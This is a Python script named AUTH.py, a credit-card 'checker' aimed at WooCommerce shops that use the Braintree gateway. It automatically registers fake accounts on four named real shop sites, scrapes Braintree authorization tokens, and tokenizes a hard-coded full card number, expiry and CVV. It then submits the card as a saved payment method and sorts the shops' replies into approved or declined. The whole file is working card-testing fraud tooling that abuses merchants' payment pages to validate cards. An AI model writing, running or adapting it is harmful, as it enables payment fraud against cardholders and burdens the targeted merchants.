"""
AUTH.py - Braintree Add Payment Method Checker
Focuses on adding payment methods to WooCommerce sites with Braintree gateway.

Flow:
1. Register account or login
2. Visit my-account pages
3. Extract Braintree token (multiple methods)
4. Tokenize card with Braintree API
5. Add payment method
"""

import asyncio
import base64
import json
import logging
import os
import random
import re
import time
import uuid
from dataclasses import dataclass
from enum import Enum
from typing import Tuple, Optional, Dict

import aiohttp

# ============================================================================
# LOGGING
# ============================================================================

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s - %(levelname)s - %(message)s",
    datefmt="%H:%M:%S"
)
logger = logging.getLogger(__name__)

# ============================================================================
# ENUMS & DATACLASSES
# ============================================================================

class Status(str, Enum):
    APPROVED = "Approved"
    DECLINED = "Declined"
    ERROR = "Error"

@dataclass
class Card:
    number: str
    month: str
    year: str
    cvv: str
    
    def masked(self) -> str:
        return f"{self.number[:6]}******{self.number[-4:]}"

@dataclass
class Result:
    status: Status
    message: str
    method: Optional[str] = None

# ============================================================================
# CONFIG
# ============================================================================

HEADERS = {
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    'accept-language': 'en-US,en;q=0.9',
}

BT_HEADERS = {
    'content-type': 'application/json',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36',
    'braintree-version': '2018-05-10',
    'accept': '*/*',
    'origin': 'https://assets.braintreegateway.com',
}

SUCCESS_MSGS = ['payment method added', 'nice! new', 'successfully added', 'duplicate card']
DECLINE_MSGS = {
    'insufficient funds': 'Low Fund',
    'card declined': 'Declined',
    'invalid cvv': 'Invalid CVV',
    'do not honor': 'Do Not Honor',
    'stolen': 'Stolen Card',
}

# ============================================================================
# HELPER FUNCTIONS
# ============================================================================

def extract(pattern: str, text: str, flags=0) -> Optional[str]:
    """Extract using regex."""
    match = re.search(pattern, text, flags)
    if match:
        for i in range(1, len(match.groups()) + 1):
            if match.group(i):
                return match.group(i)
    return None

async def fetch(session: aiohttp.ClientSession, url: str, headers: dict) -> str:
    """Fetch page."""
    async with session.get(url, headers=headers) as resp:
        if resp.status != 200:
            raise Exception(f"HTTP {resp.status}")
        return await resp.text()

async def post(session: aiohttp.ClientSession, url: str, data: str, headers: dict) -> str:
    """POST data."""
    async with session.post(url, headers=headers, data=data) as resp:
        return await resp.text()

# ============================================================================
# CORE FUNCTIONS
# ============================================================================

async def register_account(session: aiohttp.ClientSession, url: str) -> Tuple[bool, str]:
    """Register new account."""
    try:
        logger.info(f"Registering on {url}")
        
        # Get registration page
        page = await fetch(session, f'https://{url}/my-account/', HEADERS)
        
        # Extract nonce
        nonce = extract(r'name=["\']woocommerce-register-nonce["\'][^>]*value=["\']([^"\']+)', page)
        if not nonce:
            return False, "No registration nonce"
        
        # Register
        email = f"user{random.randint(10000, 99999)}@gmail.com"
        data = f"email={email}&woocommerce-register-nonce={nonce}&_wp_http_referer=%2Fmy-account%2F&register=Register"
        
        headers = HEADERS.copy()
        headers['content-type'] = 'application/x-www-form-urlencoded'
        headers['referer'] = f'https://{url}/my-account/'
        
        resp = await post(session, f'https://{url}/my-account/', data, headers)
        
        if 'logout' in resp.lower() or 'dashboard' in resp.lower():
            logger.info(f"✓ Registered: {email}")
            return True, email
        
        return False, "Registration failed"
        
    except Exception as e:
        return False, str(e)

async def get_braintree_token(session: aiohttp.ClientSession, url: str) -> Optional[str]:
    """Extract Braintree authorization token using multiple methods."""
    try:
        logger.info("Getting Braintree token...")
        
        # Visit payment methods page
        await fetch(session, f'https://{url}/my-account/payment-methods/', HEADERS)
        await asyncio.sleep(1)
        
        # Get add-payment-method page
        headers = HEADERS.copy()
        headers['referer'] = f'https://{url}/my-account/payment-methods/'
        page = await fetch(session, f'https://{url}/my-account/add-payment-method/', headers)
        
        # Method 1: Embedded token in HTML
        token = extract(r'wc_braintree_client_token["\']?\s*[=:]\s*["\']?([A-Za-z0-9+/=]{100,})', page, re.IGNORECASE)
        if token:
            try:
                decoded = base64.b64decode(token).decode('utf-8')
                auth = extract(r'"authorizationFingerprint"\s*:\s*"([^"]+)"', decoded)
                if auth:
                    logger.info("✓ Token from HTML")
                    return auth
            except:
                pass
        
        # Method 2: AJAX request
        cnonce = extract(r'"client_token_nonce"\s*:\s*"([^"]+)"', page, re.IGNORECASE)
        if cnonce:
            ajax_data = f"action=wc_braintree_credit_card_get_client_token&nonce={cnonce}"
            ajax_headers = HEADERS.copy()
            ajax_headers['content-type'] = 'application/x-www-form-urlencoded'
            ajax_headers['x-requested-with'] = 'XMLHttpRequest'
            ajax_headers['referer'] = f'https://{url}/my-account/add-payment-method/'
            
            try:
                ajax_resp = await post(session, f'https://{url}/wp-admin/admin-ajax.php', ajax_data, ajax_headers)
                data_token = extract(r'"data"\s*:\s*"([^"]+)"', ajax_resp)
                if data_token:
                    decoded = base64.b64decode(data_token).decode('utf-8')
                    auth = extract(r'"authorizationFingerprint"\s*:\s*"([^"]+)"', decoded)
                    if auth:
                        logger.info("✓ Token from AJAX")
                        return auth
            except:
                pass
        
        return None
        
    except Exception as e:
        logger.error(f"Token extraction failed: {e}")
        return None

async def tokenize_card(session: aiohttp.ClientSession, card: Card, auth_token: str) -> Optional[Tuple[str, str]]:
    """Tokenize card with Braintree."""
    try:
        logger.info(f"Tokenizing {card.masked()}")
        
        headers = BT_HEADERS.copy()
        headers['authorization'] = f'Bearer {auth_token}'
        
        payload = {
            'clientSdkMetadata': {
                'source': 'client',
                'integration': 'dropin2',
                'sessionId': str(uuid.uuid4())
            },
            'query': '''
                mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {
                    tokenizeCreditCard(input: $input) {
                        token
                        creditCard { bin brandCode last4 }
                    }
                }
            ''',
            'variables': {
                'input': {
                    'creditCard': {
                        'number': card.number,
                        'expirationMonth': card.month,
                        'expirationYear': card.year,
                        'cvv': card.cvv,
                        'cardholderName': 'John Doe',
                        'billingAddress': {'postalCode': '10001'}
                    },
                    'options': {'validate': False}
                }
            },
            'operationName': 'TokenizeCreditCard'
        }
        
        async with session.post('https://payments.braintree-api.com/graphql', headers=headers, json=payload) as resp:
            if resp.status != 200:
                return None
            
            text = await resp.text()
            token = extract(r'"token"\s*:\s*"([^"]+)"', text)
            brand = extract(r'"brandCode"\s*:\s*"([^"]+)"', text) or 'master-card'
            
            if token:
                logger.info(f"✓ Card tokenized ({brand})")
                return token, brand
            
        return None
        
    except Exception as e:
        logger.error(f"Tokenization failed: {e}")
        return None

async def add_payment_method(session: aiohttp.ClientSession, url: str, token: str, brand: str) -> Result:
    """Add payment method to account."""
    try:
        logger.info("Adding payment method...")
        
        # Get page for nonce
        headers = HEADERS.copy()
        headers['referer'] = f'https://{url}/my-account/payment-methods/'
        page = await fetch(session, f'https://{url}/my-account/add-payment-method/', headers)
        
        # Extract nonce - try multiple patterns
        nonce = extract(r'name=["\']woocommerce-add-payment-method-nonce["\'][^>]*value=["\']([^"\']+)', page)
        if not nonce:
            nonce = extract(r'"woocommerce-add-payment-method-nonce"\s*:\s*"([^"]+)"', page)
        if not nonce:
            return Result(Status.ERROR, "Payment nonce not found")
        
        # Submit payment method
        data = (
            f"payment_method=braintree_credit_card&"
            f"wc-braintree-credit-card-card-type={brand}&"
            f"wc-braintree-credit-card-3d-secure-enabled=&"
            f"wc-braintree-credit-card-3d-secure-verified=&"
            f"wc-braintree-credit-card-3d-secure-order-total=0.00&"
            f"wc_braintree_credit_card_payment_nonce={token}&"
            f"wc_braintree_device_data=&"
            f"wc-braintree-credit-card-tokenize-payment-method=true&"
            f"woocommerce-add-payment-method-nonce={nonce}&"
            f"_wp_http_referer=%2Fmy-account%2Fadd-payment-method%2F&"
            f"woocommerce_add_payment_method=1"
        )
        
        headers = HEADERS.copy()
        headers['content-type'] = 'application/x-www-form-urlencoded'
        headers['referer'] = f'https://{url}/my-account/add-payment-method/'
        
        resp = await post(session, f'https://{url}/my-account/add-payment-method/', data, headers)
        resp_lower = resp.lower()
        
        # Check success
        for msg in SUCCESS_MSGS:
            if msg in resp_lower:
                logger.info("✓ APPROVED")
                return Result(Status.APPROVED, "1000: Approved", "AUTH")
        
        # Check decline
        for key, val in DECLINE_MSGS.items():
            if key in resp_lower:
                logger.warning(f"✗ {val}")
                return Result(Status.DECLINED, val, "AUTH")
        
        return Result(Status.ERROR, "Unknown response")
        
    except Exception as e:
        logger.error(f"Add payment failed: {e}")
        return Result(Status.ERROR, str(e)[:100])

# ============================================================================
# MAIN AUTH FLOW
# ============================================================================

async def auth_check(url: str, card: Card) -> Result:
    """Complete AUTH check flow."""
    try:
        connector = aiohttp.TCPConnector(limit=100, limit_per_host=20)
        timeout = aiohttp.ClientTimeout(total=90)
        
        async with aiohttp.ClientSession(connector=connector, timeout=timeout, cookie_jar=aiohttp.CookieJar()) as session:
            
            # Step 1: Register
            success, msg = await register_account(session, url)
            if not success:
                return Result(Status.ERROR, f"Registration failed: {msg}")
            
            await asyncio.sleep(1)
            
            # Step 2: Get Braintree token
            auth_token = await get_braintree_token(session, url)
            if not auth_token:
                return Result(Status.ERROR, "Could not get Braintree token")
            
            await asyncio.sleep(1)
            
            # Step 3: Tokenize card
            result = await tokenize_card(session, card, auth_token)
            if not result:
                return Result(Status.ERROR, "Card tokenization failed")
            
            payment_token, brand = result
            await asyncio.sleep(1)
            
            # Step 4: Add payment method
            return await add_payment_method(session, url, payment_token, brand)
        
    except Exception as e:
        logger.exception("AUTH check failed")
        return Result(Status.ERROR, str(e)[:100])

# ============================================================================
# TEST RUNNER
# ============================================================================

async def test_auth():
    """Test AUTH on multiple sites."""
    print("=" * 80)
    print("AUTH.py - Braintree Add Payment Method Checker")
    print("=" * 80)
    
    SITES = [
        'djcity.com.au',
        'kolarivision.com',
        'lindywell.com',
        'strymon.net',
    ]
    
    CARD = Card('5403850087142766', '11', '2028', '427')
    print(f"\nCard: {CARD.masked()} | {CARD.month}/{CARD.year}")
    print(f"Testing {len(SITES)} sites\n")
    
    results = []
    for i, site in enumerate(SITES, 1):
        print(f"[{i}/{len(SITES)}] {site}")
        result = await auth_check(site, CARD)
        results.append({'site': site, 'result': result})
        print(f"  └─ {result.status.value}: {result.message}\n")
        await asyncio.sleep(3)
    
    # Summary
    print("=" * 80)
    print("SUMMARY")
    print("=" * 80)
    approved = [r for r in results if r['result'].status == Status.APPROVED]
    declined = [r for r in results if r['result'].status == Status.DECLINED]
    errors = [r for r in results if r['result'].status == Status.ERROR]
    
    print(f"✓ Approved: {len(approved)}")
    print(f"✗ Declined: {len(declined)}")
    print(f"⚠ Errors: {len(errors)}")

if __name__ == "__main__":
    asyncio.run(test_auth())
